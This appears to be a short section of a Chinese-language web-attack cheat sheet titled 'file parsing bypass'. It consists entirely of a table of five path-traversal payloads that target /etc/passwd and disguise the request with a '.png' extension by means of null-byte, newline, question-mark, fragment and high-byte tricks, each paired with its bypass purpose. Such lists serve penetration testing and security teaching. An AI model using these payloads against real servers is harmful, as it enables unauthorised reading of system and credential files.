### 6. 文件解析绕过

| Payload                      | 绕过意图                            |
| ---------------------------- | ----------------------------------- |
| `../../../etc/passwd%00.png` | 利用 `%00` 空字节截断（老版本 PHP） |
| `../../../etc/passwd%0a.png` | 利用换行字符绕过匹配                |
| `../../../etc/passwd?.png`   | 加问号后端可能忽略 `?.png` 部分     |
| `../../../etc/passwd#.png`   | URL 片段不参与路径解析              |
| `../../../etc/passwd%ff.png` | 高位字符扰乱路径解析                |
